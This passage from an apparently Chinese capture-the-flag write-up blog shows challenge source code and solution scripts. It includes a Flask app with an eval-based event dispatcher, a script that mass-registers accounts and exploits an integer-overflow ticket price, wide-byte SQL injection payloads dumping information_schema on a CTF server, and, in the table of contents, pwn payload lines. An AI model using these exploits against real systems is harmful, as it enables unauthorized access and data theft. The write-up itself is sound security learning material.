old_ubound, new_dbound, new_ubound)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (v-old_dbound)*<span class="number">1.0</span>/(old_ubound-old_dbound)*(new_ubound-new_dbound) + new_dbound</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image_to_array</span><span class="params">(img)</span>:</span></span><br><span class="line">    img_arr = linear_map(np.array(img.getdata(), np.uint8).reshape(img.size[<span class="number">1</span>], img.size[<span class="number">0</span>], <span class="number">3</span>), <span class="number">0</span>, <span class="number">255</span>, -max_lim, max_lim)</span><br><span class="line">    <span class="keyword">return</span> img_arr[:, :, <span class="number">1</span>] + img_arr[:, :, <span class="number">2</span>] * <span class="number">1j</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'usage: python3 voice_lock.py &lt;path_to_your_voice.wav&gt;'</span>)</span><br><span class="line">        exit()</span><br><span class="line">    data, sr = librosa.load(sys.argv[<span class="number">1</span>], sr=sr)</span><br><span class="line">    C_fingerprint = image_to_array(Image.open(<span class="string">'fingerprint.png'</span>))</span><br><span class="line">    print(<span class="string">'please wait...'</span>)</span><br><span class="line">    sqr_diff = calc_sqr_diff(data, C_fingerprint)</span><br><span class="line">    print(<span class="string">'sqr diff ='</span>, sqr_diff)</span><br><span class="line">    <span class="keyword">if</span> sqr_diff &lt; <span class="number">0.001</span>:</span><br><span class="line">        print(<span class="string">'access granted, congratulations!'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'access denied'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66747e857'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">	session[<span class="string">'log'</span>].append(event)</span><br><span class="line">	<span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">	<span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">		request.event_queue += event</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">	haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">	<span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">		haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">	<span class="keyword">return</span> haystack</span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">	valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">	resp = <span class="keyword">None</span></span><br><span class="line">	<span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">            event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">            request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">                <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                is_action = event[<span class="number">0</span>] == <span class="string">'a'</span>                 </span><br><span class="line">                action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)               <span class="comment"># ?action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">                args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)    <span class="comment"># ['action:buy;5', 'action:get_flag']</span></span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">				ret_val = event_handler(args)</span><br><span class="line">			<span class="keyword">except</span> RollBackException:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = <span class="string">''</span></span><br><span class="line">				resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">				resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">				session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">				session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">except</span> Exception, e:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = <span class="string">''</span></span><br><span class="line">				<span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = ret_val</span><br><span class="line">				<span class="keyword">else</span>: resp += ret_val</span><br><span class="line">	<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">	session.modified = <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">return</span> resp</span><br><span class="line">	<span class="string">'action:buy;1'</span></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">	querystring = urllib.unquote(request.query_string)</span><br><span class="line">	request.event_queue = []</span><br><span class="line">	<span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">		querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">		session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">		session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">		session[<span class="string">'log'</span>] = []</span><br><span class="line">	request.prev_session = dict(session)</span><br><span class="line">	trigger_event(querystring)</span><br><span class="line">	<span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	page = args[<span class="number">0</span>]</span><br><span class="line">	html = <span class="string">''</span></span><br><span class="line">	html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">	<span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">		<span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">		html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">	html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">	bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line">	</span><br><span class="line">		source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">		html = <span class="string">''</span></span><br><span class="line">		<span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">			html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">			html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">			</span><br><span class="line">		<span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">			<span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">				html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				html += line</span><br><span class="line">		source.close()</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">			headers = &#123;&#125;</span><br><span class="line">			headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">			headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">			<span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> html</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	num_items = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">	session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">	trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">	session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	flag = args[<span class="number">0</span>]</span><br><span class="line">	<span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">		trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">	trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
<p>{u’points’: 0, u’num_items’: 3, u’log’: [‘action:buy;1’, [‘func:consume_point;1’, ‘action:view;index’], ‘action:view;shop’, ‘action:buy;1’, [‘func:consume_point;1’, ‘action:view;index’]]}<br>{u’points’: 0, u’log’: [[‘func:consume_point;1’, ‘action:view;index’], ‘action:view;shop’, ‘action:buy;1’, [‘func:consume_point;1’, ‘action:view;index’], ‘action:view;reset’]}<br>{u’points’: 3, u’num_items’: 0, u’log’: [‘action:view;index’]}</p>
<p>{u’points’: 0, u’num_items’: 3, u’log’: [[‘func:consume_point;1’, ‘action:view;index’], ‘action:buy;1’, [‘func:consume_point;1’, ‘action:view;index’], ‘action:buy;1’, [‘func:consume_point;1’, ‘action:view;index’]]}</p>
<p>event_queue = [‘action:view;shop’, ‘func:consume_point;1’, ‘action:view;index’]</p>
<p>{u’points’: 3, u’num_items’: 0, u’log’: [‘action:view;index’, ‘action:index;False#False’, ‘action:view;index’, ‘action:index;False#False’, ‘action:view;index’]}</p>
<p>30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A<br>1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7<br>1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC<br>300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA<br>1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9<br>9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45<br>C53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</p>
<p>#!/usr/bin/env python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><h1 id="Date-2019-04-15-22-18-34"><a href="#Date-2019-04-15-22-18-34" class="headerlink" title="@Date    : 2019-04-15 22:18:34"></a>@Date    : 2019-04-15 22:18:34</h1><h1 id="Author-mote"><a href="#Author-mote" class="headerlink" title="@Author  : mote"></a>@Author  : mote</h1><p>import os<br>import requests<br>import re</p>
<h1 id="register-url-‘http-117-51-147-155-5050-ctf-api-register-name-aabc-amp-password-aabcaabc-39"><a href="#register-url-‘http-117-51-147-155-5050-ctf-api-register-name-aabc-amp-password-aabcaabc-39" class="headerlink" title="register_url = ‘http://117.51.147.155:5050/ctf/api/register?name=aabc&amp;password=aabcaabc&#39;"></a>register_url = ‘<a href="http://117.51.147.155:5050/ctf/api/register?name=aabc&amp;password=aabcaabc&#39;">http://117.51.147.155:5050/ctf/api/register?name=aabc&amp;password=aabcaabc&#39;</a></h1><p>login_url = ‘<a href="http://117.51.147.155:5050/ctf/api/login?name=mote&amp;password=motemote&#39;">http://117.51.147.155:5050/ctf/api/login?name=mote&amp;password=motemote&#39;</a></p>
<p>def get_cookie(name,password):<br>    register_url = ‘<a href="http://117.51.147.155:5050/ctf/api/register?name={0}&amp;password={1}&#39;.format(name,password)">http://117.51.147.155:5050/ctf/api/register?name={0}&amp;password={1}&#39;.format(name,password)</a><br>    r = requests.get(url = register_url)<br>    ret_headers = r.headers<br>    user_name =  ret_headers[‘Set-Cookie’].split(“;”)[0].split(“=”)[1]<br>    REVEL_SESSION = ret_headers[‘Set-Cookie’].split(“;”)[1].split(“=”)[2]<br>    cookies = dict(user_name=user_name,REVEL_SESSION=REVEL_SESSION)<br>    return cookies</p>
<p>def buy_ticket(cookies):<br>    r = requests.get(url=’<a href="http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&#39;,cookies=cookies">http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&#39;,cookies=cookies</a>)</p>
<pre><code># print r.text
rule = r&apos;bill_id\&quot;:\&quot;(.*?)\&quot;&apos;
bill_id = re.findall(rule,r.text)[0]
return bill_id
</code></pre><p>def pay_ticket(cookies,bill_id):<br>    pay_ticket_url = ‘<a href="http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={0}&#39;.format(bill_id)">http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={0}&#39;.format(bill_id)</a><br>    r = requests.get(url=pay_ticket_url,cookies=cookies)<br>    id_rule = r’your_id\”:(.<em>?),’<br>    ticket_rule = r’your_ticket\”:\”(.</em>?)\”‘<br>    robot_id = re.findall(id_rule,r.text)[0]<br>    ticket = re.findall(ticket_rule,r.text)[0]<br>    return robot_id,ticket</p>
<p>def kill_robot(cookies,robot_id,ticket):</p>
<pre><code># 要用自己的账号来杀robot
kill_url = &apos;http://117.51.147.155:5050/ctf/api/remove_robot?id={0}&amp;ticket={1}&apos;.format(robot_id,ticket)
r = requests.get(url=kill_url,cookies=cookies)
print r.text.encode(&quot;utf-8&quot;)
</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    for i in range(100):<br>        robot_name = ‘mo_re’+str(i)<br>        cookie = get_cookie(robot_name,’bbccddee’)<br>        robot_id,ticket = pay_ticket(cookie,buy_ticket(cookie))<br>        my_cookie = {‘REVEL_SESSION’: ‘212b1964557ce01ac0e757616dc19d10’, ‘user_name’: ‘mote’}<br>        kill_robot(my_cookie,robot_id,ticket)</p>
<p>import requests</p>
<h1 id="url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39"><a href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39" class="headerlink" title="url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \"></a>url = ‘<a href="http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39;">http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39;</a> \</h1><h1 id="‘id-df-27-20union-select-1-2-3-SCHEMA-NAME-5-‘"><a href="#‘id-df-27-20union-select-1-2-3-SCHEMA-NAME-5-‘" class="headerlink" title="‘id=%df%27%20union select 1,2,3,SCHEMA_NAME,5 ‘ \"></a>‘id=%df%27%20union select 1,2,3,SCHEMA_NAME,5 ‘ \</h1><h1 id="‘from-information-schema-SCHEMATA-23’"><a href="#‘from-information-schema-SCHEMATA-23’" class="headerlink" title="‘from information_schema.SCHEMATA %23’"></a>‘from information_schema.SCHEMATA %23’</h1><h1 id="url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-1"><a href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-1" class="headerlink" title="url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \"></a>url = ‘<a href="http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39;">http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39;</a> \</h1><h1 id="‘id-df-27-20union-select-1-2-3-TABLE-NAME-5-‘"><a href="#‘id-df-27-20union-select-1-2-3-TABLE-NAME-5-‘" class="headerlink" title="‘id=%df%27%20union select 1,2,3,TABLE_NAME,5 ‘ \"></a>‘id=%df%27%20union select 1,2,3,TABLE_NAME,5 ‘ \</h1><h1 id="‘from-information-schema-TABLES-where-TABLE-SCHEMA-0x6374666462-23’"><a href="#‘from-information-schema-TABLES-where-TABLE-SCHEMA-0x6374666462-23’" class="headerlink" title="‘from information_schema.TABLES where TABLE_SCHEMA=0x6374666462 %23’"></a>‘from information_schema.TABLES where TABLE_SCHEMA=0x6374666462 %23’</h1><h1 id="url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-2"><a href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-2" class="headerlink" title="url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \"></a>url = ‘<a href="http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39;">http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39;</a> \</h1><h1 id="‘id-df-27-20union-select-1-2-3-COLUMN-NAME-5-‘"><a href="#‘id-df-27-20union-select-1-2-3-COLUMN-NAME-5-‘" class="headerlink" title="‘id=%df%27%20union select 1,2,3,COLUMN_NAME,5 ‘ \"></a>‘id=%df%27%20union select 1,2,3,COLUMN_NAME,5 ‘ \</h1><h1 id="‘from-information-schema-COLUMNS-where-TABLE-NAME-0x6374665F66686D4852504C35-23’"><a href="#‘from-information-schema-COLUMNS-where-TABLE-NAME-0x6374665F66686D4852504C35-23’" class="headerlink" title="‘from information_schema.COLUMNS where TABLE_NAME=0x6374665F66686D4852504C35 %23’"></a>‘from information_schema.COLUMNS where TABLE_NAME=0x6374665F66686D4852504C35 %23’</h1><h1 id="url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-3"><a href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-3" class="headerlink" title="url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \"></a>url = ‘<a href="http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39;">http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39;</a> \</h1><h1 id="‘id-df-27-20union-select-1-2-3-ctf-value-5-‘"><a href="#‘id-df-27-20union-select-1-2-3-ctf-value-5-‘" class="headerlink" title="‘id=%df%27%20union select 1,2,3,ctf_value,5 ‘ \"></a>‘id=%df%27%20union select 1,2,3,ctf_value,5 ‘ \</h1><h1 id="‘from-ctfdb-ctf-fhmHRPL5-23’"><a href="#‘from-ctfdb-ctf-fhmHRPL5-23’" class="headerlink" title="‘from ctfdb.ctf_fhmHRPL5 %23’"></a>‘from ctfdb.ctf_fhmHRPL5 %23’</h1><h1 id="print-requests-get-url-text"><a href="#print-requests-get-url-text" class="headerlink" title="print(requests.get(url).text)"></a>print(requests.get(url).text)</h1><p>q0：[a2 = 3053, a1 = 4006, a3 = 2503, a4 = 2560]<br>0xfa6-0xbed-0x9c7-0xa00<br>q1: 26365399 0x1924dd7</p>
<p>q2: 7700 0x1e14</p>
<p>q3: 18640 0x48d0</p>
<p>q4: 40320 0x9d80</p>
<p>flag{01924dd7-1e14-48d0-9d80-fa6bed9c7a00}</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1-滴"><span class="toc-number">1.</span> <span class="toc-text">web1 滴</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-WEB签到题"><span class="toc-number">2.</span> <span class="toc-text">web2 WEB签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text">pwn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re2"><span class="toc-number"></span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#for-k-in-l"><span class="toc-number"></span> <span class="toc-text">for k in l:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#p-process-‘-xpwn’"><span class="toc-number"></span> <span class="toc-text">p = process(‘./xpwn’)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-hex-libc-symbols-‘-IO-setbuffer’"><span class="toc-number"></span> <span class="toc-text">print hex(libc.symbols[‘_IO_setbuffer’])</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-hex-u32-addr"><span class="toc-number"></span> <span class="toc-text">print(hex(u32(addr)))</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gdb-attach-p"><span class="toc-number"></span> <span class="toc-text">gdb.attach(p)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload-p32-libc-addr-0x5f065-0x10-1-’-x00’"><span class="toc-number"></span> <span class="toc-text">payload = p32(libc_addr+0x5f065)*(0x10+1)+’\x00’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coding-utf-8"><span class="toc-number"></span> <span class="toc-text">-- coding: utf-8 --</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Date-2019-04-15-22-18-34"><span class="toc-number"></span> <span class="toc-text">@Date    : 2019-04-15 22:18:34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Author-mote"><span class="toc-number"></span> <span class="toc-text">@Author  : mote</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#register-url-‘http-117-51-147-155-5050-ctf-api-register-name-aabc-amp-password-aabcaabc-39"><span class="toc-number"></span> <span class="toc-text">register_url = ‘http://117.51.147.155:5050/ctf/api/register?name=aabc&amp;password=aabcaabc&#39;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39"><span class="toc-number"></span> <span class="toc-text">url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘id-df-27-20union-select-1-2-3-SCHEMA-NAME-5-‘"><span class="toc-number"></span> <span class="toc-text">‘id=%df%27%20union select 1,2,3,SCHEMA_NAME,5 ‘ \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘from-information-schema-SCHEMATA-23’"><span class="toc-number"></span> <span class="toc-text">‘from information_schema.SCHEMATA %23’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-1"><span class="toc-number"></span> <span 